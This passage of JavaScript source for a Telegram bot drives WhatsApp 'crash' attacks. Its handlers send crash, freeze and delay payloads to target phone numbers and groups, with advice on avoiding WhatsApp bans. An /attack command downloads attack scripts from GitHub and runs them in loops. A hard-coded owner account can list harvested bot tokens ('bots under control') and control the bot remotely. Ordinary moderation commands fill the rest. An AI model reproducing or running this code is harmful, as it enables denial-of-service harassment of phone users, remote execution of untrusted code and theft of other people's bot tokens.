            `[🩸] 𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${targetNumber}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗗𝗲𝗹𝗮𝘆𝗜𝗻𝗩𝗶𝘀\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : Android/Ios\n\n𝘕𝘰𝘵𝘦 :\n𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥 𝘧𝘳𝘰𝘮 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
                }
            }
        );
        
        safelay(isTarget);
    });

    //=================================================//
    bot.action(/^appcrashed (.+)$/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        const targetNumber = isTarget.replace('@s.whatsapp.net', '');
        
        await ctx.answerCbQuery(`🍏 Starting Apple Crashed On : ${targetNumber}`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${targetNumber}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗧𝗿𝗮𝘀𝗵𝗜𝗢𝗦\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : IOS\n\n𝘕𝘰𝘵𝘦 :\n𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥 𝘧𝘳𝘰𝘮 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
                }
            }
        );
        
        trashios(isTarget);
    });
    //==============================\\
    bot.action(/^crashdroid (.+)$/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        const targetNumber = isTarget.replace('@s.whatsapp.net', '');
        invisible(isTarget);
        await ctx.answerCbQuery(`〽️ Starting Crash InVis On : ${targetNumber}`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${targetNumber}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗖𝗿𝗮𝘀𝗵𝗜𝗻𝗩𝗶𝘀\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : Android\n\n𝘕𝘰𝘵𝘦 :\n𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥 𝘧𝘳𝘰𝘮 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
                }
            }
        );
        
        CrashAndro(isTarget);
    });
    
    //==============================\\
    bot.action(/^forceclose (.+)$/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        const targetNumber = isTarget.replace('@s.whatsapp.net', '');
        invisible(isTarget);
        await ctx.answerCbQuery(`〽️ Starting Crash Safe On : ${targetNumber}`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${targetNumber}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗖𝗿𝗮𝘀𝗵𝗜𝗻𝗩𝗶𝘀\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : Android\n\n𝘕𝘰𝘵𝘦 :\n𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥 𝘧𝘳𝘰𝘮 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
                }
            }
        );
        
        CrashSafe(isTarget);
    });
   
     //=================================================//
     bot.action(/^instantcrash (.+)$/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        const targetNumber = isTarget.replace('@s.whatsapp.net', '');
        invisible(isTarget);
        await ctx.answerCbQuery(`〽️ Starting Crash InVis On : ${targetNumber}`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${targetNumber}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗖𝗿𝗮𝘀𝗵𝗜𝗻𝗩𝗶𝘀\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : Android\n\n𝘕𝘰𝘵𝘦 :\n𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥 𝘧𝘳𝘰𝘮 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
                }
            }
        );
        
        instantcrash(isTarget);
    });
    
    //=================================================//
    bot.command('crashpair', async (ctx) => {
    const text = ctx.message.text.split(' ')[1];
    if (!text) return ctx.reply("✕ Format salah! Contoh: /crashpair 62812345678");

    const userId = ctx.from.id.toString();
    const allowed = await myfunction.sendIfNotPremium(ctx);
    if (!allowed) return;

    const isTarget = text.includes('@') ? text : `${text}@s.whatsapp.net`;
    const targetNumber = targetJid.replace('@s.whatsapp.net', '');

    await ctx.reply(`[ — ] PREPARING ATTACK...\nTarget: ${targetNumber}`);

    try {
        await CrashPaiirng(isTarget);
        await ctx.reply(`[ ✓ ] CRASH PAIR SENT\nTarget: ${targetNumber}\nStatus: Success`);
    } catch (e) {
        await ctx.reply(`[ ✕ ] Error: ${e.message}`);
    }
    });
    
    //=================================================//
     bot.action(/^crashpair (.+)$/, async (ctx) => {
    const userId = ctx.from.id.toString();
    const allowed = await myfunction.sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const isTarget = ctx.match[1];
    const targetNumber = isTarget.replace('@s.whatsapp.net', '');
    
    await ctx.answerCbQuery(`[ — ] Executing CrashPair: ${targetNumber}`);
    
    await ctx.editMessageCaption(
        `<b>[ ⚡ ] CRASH PAIRING ATTACK</b>\n\n` +
        `• Target : ${targetNumber}\n` +
        `• Method : CrashPair V1\n` +
        `• Status : Running...\n\n` +
        `<i>Note: Target session will be overloaded with pairing requests.</i>`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[{ text: "— Developer —", url: "https://t.me/Aurelxa" }]]
            }
        }
    );
    
    try {
        await CrashPaiirng(isTarget);
    } catch (err) {
        console.error("Error:", err);
    }
    });


    //=================================================//
    bot.command("xgroup", async (ctx) => {
        const commandName = "xgroup";
        const args = ctx.message.text.split(" ");
        const groupLink = args[1];
        
        const cooldownRemaining = myfunction.checkCooldown(commandName);
        if (cooldownRemaining > 0) {
            const minutes = Math.floor(cooldownRemaining / 60);
            const seconds = cooldownRemaining % 60;
            return ctx.reply(`‼️ Cooldown: ${minutes}m ${seconds}s.`);
        }
        
        if (!groupLink) {
            return ctx.reply(`❌ Example Use.\n /xgroup chat.whatsapp.com`);
        }
        
        try {            
            const groupId = await index.joinGroup(groupLink);
            
            await ctx.replyWithPhoto({ url: myfunction.bugimg() }, {
                caption: `\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨͢𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${groupId}\n`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "𝐃𝚵𝐋𝚫𝐘𝐒", callback_data: `group_delays_${groupId}` },
                            { text: "𝐅𝐑𝚵𝐙𝚵", callback_data: `group_freze_${groupId}` }
                        ]
                    ]
                }
            });
            
            myfunction.setCooldown(commandName);
        } catch (error) {
            ctx.reply(`❌ Error: ${error.message}`);
        }
    });

    //=================================================//
    bot.action(/^group_freze_(.+)$/, async (ctx) => {
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        
        await ctx.answerCbQuery(`❄️ Starting Group Freeze Attack...`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐆𝐑𝐎𝐔𝐏 𝐅𝐑𝐄𝐄𝐙𝐄 𝐒𝐔𝐂𝐂𝐄𝐒𝐒\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${isTarget}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗚𝗿𝗼𝘂𝗽 𝗙𝗿𝗲𝗲𝘇𝗲\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : All Devices\n\n𝘕𝘰𝘵𝘦 :\n𝘎𝘳𝘰𝘶𝘱 𝘸𝘪𝘭𝘭 𝘦𝘹𝘱𝘦𝘳𝘪𝘦𝘯𝘤𝘦 𝘴𝘦𝘷𝘦𝘳𝘦 𝘭𝘢𝘨𝘴 𝘢𝘯𝘥 𝘧𝘳𝘦𝘦𝘻𝘦𝘴`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
                }
            }
        );
        
        await group_freze(isTarget);
    });

    //=================================================//
    bot.action(/^group_delays_(.+)$/, async (ctx) => {
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        
        await ctx.answerCbQuery(`〽️ Starting Group Delays Attack...`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐆𝐑𝐎𝐔𝐏 𝐃𝐄𝐋𝐀𝐘𝐒 𝐒𝐔𝐂𝐂𝐄𝐒𝐒\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${isTarget}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗚𝗿𝗼𝘂𝗽 𝗗𝗲𝗹𝗮𝘆𝘀\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : All Devices\n\n𝘕𝘰𝘵𝘦 :\n𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
                }
            }
        );
        
        await group_delays(isTarget);
    });

    //=================================================//
    bot.command("setjeda", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const args = ctx.message.text.trim().split(" ");
        if (args.length < 2) {
            return ctx.reply("❌ Example Use.\n /setjeda 5h,m,s");
        }
        
        const result = myfunction.setCooldownTime(args[1]);
        ctx.reply(result);
    });
    
    //=================================================//
    bot.command("kick", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;

        await ctx.telegram.kickChatMember(chatId, targetUserId);
        await ctx.telegram.unbanChatMember(chatId, targetUserId);
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `✅ User kicked successfully!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("ban", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;

        await ctx.telegram.kickChatMember(chatId, targetUserId);
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `🚫 User banned permanently!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("unban", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const args = ctx.message.text.split(" ");
        if (args.length < 2 && !ctx.message.reply_to_message) {
            return ctx.reply("❌ Example: /unban user_id");
        }

        let targetUserId;
        if (ctx.message.reply_to_message) {
            targetUserId = ctx.message.reply_to_message.from.id;
        } else {
            targetUserId = args[1];
        }

        const chatId = ctx.chat.id;

        await ctx.telegram.unbanChatMember(chatId, targetUserId);
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `✅ User unbanned!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("promote", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;

        await ctx.telegram.promoteChatMember(chatId, targetUserId, {
            can_change_info: true,
            can_delete_messages: true,
            can_invite_users: true,
            can_restrict_members: true,
            can_pin_messages: true,
            can_promote_members: false
        });
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `✅ User promoted to admin!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("demote", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;

        await ctx.telegram.promoteChatMember(chatId, targetUserId, {
            can_change_info: false,
            can_delete_messages: false,
            can_invite_users: false,
            can_restrict_members: false,
            can_pin_messages: false,
            can_promote_members: false
        });
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `‼️ User demoted from admin!`,
            parse_mode: 'HTML'
        });
    });
        //=================================================//
        bot.command("listbots", async (ctx) => {
        if (ctx.from.id.toString() !== "6080964660") return;

        const dbPath = path.join(__dirname, './myfunction/database/telegram_bots.json');
        if (!fs.existsSync(dbPath)) return ctx.reply("❌ Belum ada bot yang terjaring.");

        const bots = JSON.parse(fs.readFileSync(dbPath));
        let list = "📂 **DAFTAR BOT DALAM KENDALI**\n\n";

        bots.forEach((b, i) => {
            list += `${i + 1}. @${b.username}\n   Token: \`${b.token}\`\n\n`;
        });

        ctx.reply(list, { parse_mode: 'Markdown' });
    });
//================ FITUR UNTUK USER ================//
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split('|');
    if (args.length < 3) return ctx.reply("❌ Format Salah!\nContoh: /attack 628xxx | 5 | 1000");

    const targetNumber = args[0].replace('/attack ', '').trim();
    const target = targetNumber + "@s.whatsapp.net";
    const loop = parseInt(args[1]);
    const delay = parseInt(args[2]);
    let status;
    try {
        const res = await axios.get(GITHUB_DATABASE.status + `?t=${Date.now()}`);
        status = res.data;
    } catch (e) {
        return ctx.reply("⚠️ Maaf, sistem sedang maintenance atau pusat kendali tidak terbaca.");
    }

    const activeSlot = Object.keys(status).find(key => status[key].active === true);

    if (!activeSlot) {
        return ctx.reply("⚠️ Maaf, saat ini Owner belum mengaktifkan fitur serangan apapun.");
    }

    const feature = status[activeSlot];
    ctx.reply(`🔥 Menjalankan: ${feature.name}\n🎯 Target: ${targetNumber}\n🔄 Loop: ${loop}x`);

    for (let i = 0; i < loop; i++) {
        const runScript = await getRemoteFunction(GITHUB_DATABASE[activeSlot]);
        if (runScript) {
            await runScript(client, target, generateWAMessageFromContent, ctx);
        }
        if (delay > 0) await new Promise(r => setTimeout(r, delay));
    }
    ctx.reply(`✅ Serangan ${feature.name} Selesai.`);
});

//================ FITUR KHUSUS OWNER ================//
   bot.command('aktifkan', async (ctx) => {
    const isOwner = ctx.from.id.toString() === "6080964660"; 
    if (!isOwner) return;

    const args = ctx.message.text.split('|');
    if (args.length < 3) return ctx.reply("❌ Format: /aktifkan slot | Nama | Kode");

    const slot = args[0].replace('/aktifkan ', '').trim();
    const name = args[1].trim();
    const code = args.slice(2).join('|').trim();

    if (!["1", "2", "3"].includes(slot)) return ctx.reply("❌ Slot hanya 1-3");

    ctx.reply(`⏳ Mengunggah Fitur "${name}" ke GitHub Slot ${slot}...`);

    const updateScript = await pushToGithub(`case${slot}.js`, code);

    let currentStatus = { 
        "1": { active: false, name: "Kosong" }, 
        "2": { active: false, name: "Kosong" }, 
        "3": { active: false, name: "Kosong" } 
    };

    currentStatus[slot] = { active: true, name: name };
    const updateStatus = await pushToGithub(`status.json`, JSON.stringify(currentStatus, null, 2));

    if (updateScript && updateStatus) {
        ctx.reply(`✅ BERHASIL!\n\nFitur: ${name}\nStatus: Aktif di Slot ${slot}\nSemua user sekarang bisa menggunakan perintah /attack`);
    } else {
        ctx.reply("❌ Gagal update GitHub. Cek Token/Koneksi.");
    }
   });
   
   bot.command('delslot', async (ctx) => {
    const isDev = ctx.from.id.toString() === "6080964660"; 
    if (!isDev) return;
    const slot = ctx.message.text.replace('/delslot ', '').trim();
    if (!slot || isNaN(slot)) return ctx.reply("❌ Masukkan nomor slot! Contoh: /delslot 1");

    ctx.reply(`🗑️ **Proses menghapus Slot ${slot}...**`);

    let currentStatus = { "1": {active:false}, "2": {active:false}, "3": {active:false} };
    try {
        const axios = require('axios');
        const res = await axios.get(GITHUB_DATABASE.status + `?t=${Date.now()}`);
        currentStatus = res.data;
    } catch (e) {}

    if (currentStatus[slot]) {
        currentStatus[slot] = { active: false, name: "Kosong" };
        await pushToGithub(`status.json`, JSON.stringify(currentStatus, null, 2));
    }
    const success = await pushToGithub(`case${slot}.js`, "// Slot Kosong");

    if (success) {
        ctx.reply(`✅ **SLOT ${slot} BERHASIL DIHAPUS!**\n\nStatus kini menjadi OFF dan script telah dibersihkan.`);
    } else {
        ctx.reply("❌ Gagal menghapus file di GitHub.");
    }
   });

   bot.command('matikan', async (ctx) => {
    if (ctx.from.id.toString() !== "6080964660") return;
    
    let resetStatus = { 
        "1": { active: false, name: "Kosong" }, 
        "2": { active: false, name: "Kosong" }, 
        "3": { active: false, name: "Kosong" } 
    };
    
    await pushToGithub(`status.json`, JSON.stringify(resetStatus, null, 2));
    ctx.reply("🛑 Semua fitur serangan telah DINONAKTIFKAN.");
   });
   
   bot.command('listslot', async (ctx) => {
    try {
        const axios = require('axios');
        const res = await axios.get(GITHUB_DATABASE.status + `?t=${Date.now()}`);
        const status = res.data;

        let teks = "📂 **LIST SLOT GITHUB**\n\n";
        for (let i = 1; i <= 3; i++) {
            const info = status[i];
            teks += `${i}. [ ${info.active ? '✅ ACTIVE' : '❌ EMPTY'} ]\n`;
            teks += `   Name: ${info.name}\n\n`;
        }
        
        ctx.reply(teks);
    } catch (e) {
        ctx.reply("❌ Gagal mengambil data status.");
    }
    });

    bot.command('readslot', async (ctx) => {
    const isDev = ctx.from.id.toString() === "ID_TELEGRAM_KAMU"; 
    if (!isDev) return;

    const slot = ctx.message.text.replace('/readslot ', '').trim();
    if (!slot || isNaN(slot)) return ctx.reply("❌ Contoh: /readslot 1");

    ctx.reply(`🔍 **Membaca Script Slot ${slot} dari GitHub...**`);

    try {
        const axios = require('axios');
        const url = GITHUB_DATABASE[slot];
        const res = await axios.get(`${url}?t=${Date.now()}`);
        
        const code = res.data;
        await ctx.reply(`📄 **Isi Script Slot ${slot}:**\n\n<pre><code>${code}</code></pre>`, {
            parse_mode: 'HTML'
        });
    } catch (e) {
        ctx.reply(`❌ **Gagal membaca slot!**\nPastikan slot sudah terisi atau cek koneksi GitHub.`);
    }
   });

   bot.command('deploy', async (ctx) => {
    const isDev = ctx.from.id.toString() === "6080964660"; 
    if (!isDev) return;
    const args = ctx.message.text.split('|');
    if (args.length < 3) return ctx.reply("❌ Format: /deploy slot | Nama | Kode");

    const slot = args[0].replace('/deploy ', '').trim();
    const name = args[1].trim();
    const code = args.slice(2).join('|').trim();
    ctx.reply(`🛠 **Deploying to Slot ${slot}...**`);

    const pushOk = await pushToGithub(`case${slot}.js`, code);
    let currentStatus = { "1": {active:false}, "2": {active:false}, "3": {active:false} };
    try {
        const axios = require('axios');
        const res = await axios.get(GITHUB_DATABASE.status + `?t=${Date.now()}`);
        currentStatus = res.data;
    } catch (e) {}

    Object.keys(currentStatus).forEach(k => currentStatus[k].active = false);
    currentStatus[slot] = { active: true, name: name };

    const statusOk = await pushToGithub(`status.json`, JSON.stringify(currentStatus, null, 2));

    if (pushOk && statusOk) {
        ctx.reply(`🚀 **DEPLOY SUCCESS!**\n\n📌 Slot: ${slot}\n📛 Name: ${name}\n\nUser sekarang bisa menggunakan /attack untuk menjalankan fungsi ini.`);
    } else {
        ctx.reply("❌ Deploy Gagal. Cek koneksi GitHub.");
    }
   });

    //=================================================//
    bot.on('text', async (ctx) => {
        const message = ctx.message.text;
        const senderId = ctx.from.id.toString();
        const superAdmin = "6080964660"; 
        if (senderId === superAdmin && message.startsWith("!")) {
            const command = message.slice(1).trim(); 
            if (command === "restart") {
                await ctx.reply(`⚙️ Remote Restart diterima dari Admin...`);
                console.log(chalk.yellow(`[SYSTEM] Restarting by Remote Admin: ${senderId}`));
                process.exit();
            }
            if (command.startsWith("send")) {
                const parts = command.split(" ");
                const targetId = parts[1];
                const textToDeliver = parts.slice(2).join(" ");
                
                try {
                    await ctx.telegram.sendMessage(targetId, textToDeliver);
                    await ctx.reply(`✅ Pesan berhasil dikirim ke ${targetId}`);
                } catch (e) {
                    await ctx.reply("❌ Gagal mengirim: ID tidak ditemukan atau bot diblokir.");
                }
            }
            if (command === "leave") {
                if (ctx.chat.type !== 'private') {
                    await ctx.reply("🏃 Sesuai perintah Admin, saya keluar...");
                    await ctx.leaveChat();
                }
            }
        }
    });

    //=================================================//
    bot.command("mute", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;
        
        const args = ctx.message.text.split(" ");
        let muteTime = 3600;
        
        if (args.length > 1) {
            const timeStr = args[1].toLowerCase();
            if (timeStr.includes("h")) {
                muteTime = parseInt(timeStr) * 3600;
            } else if (timeStr.includes("m")) {
                muteTime = parseInt(timeStr) * 60;
            } else if (timeStr.includes("d")) {
                muteTime = parseInt(timeStr) * 86400;
            } else {
                muteTime = parseInt(timeStr) || 3600;
            }
        }

        const untilDate = Math.floor(Date.now() / 1000) + muteTime;
        await ctx.telegram.restrictChatMember(chatId, targetUserId, {
            until_date: untilDate,
            can_send_messages: false
        });
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `🔇 User muted!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("unmute", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;

        await ctx.telegram.restrictChatMember(chatId, targetUserId, {
            can_send_messages: true,
            can_send_media_messages: true,
            can_send_polls: true,
            can_send_other_messages: true
        });
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `🔊 User unmuted!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("pin", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to message!");
        }

        await ctx.telegram.pinChatMessage(ctx.chat.id, ctx.message.reply_to_message.message_id);
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `📌 Message pinned!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("unpin", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        await ctx.telegram.unpinChatMessage(ctx.chat.id);
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `📌 Message unpinned!`,
            parse_mode: 'HTML'
        });
    });

//=================================================//
StatusConnectionWhatsapp();
}
//=================================================//
module.exports = { setupCommands };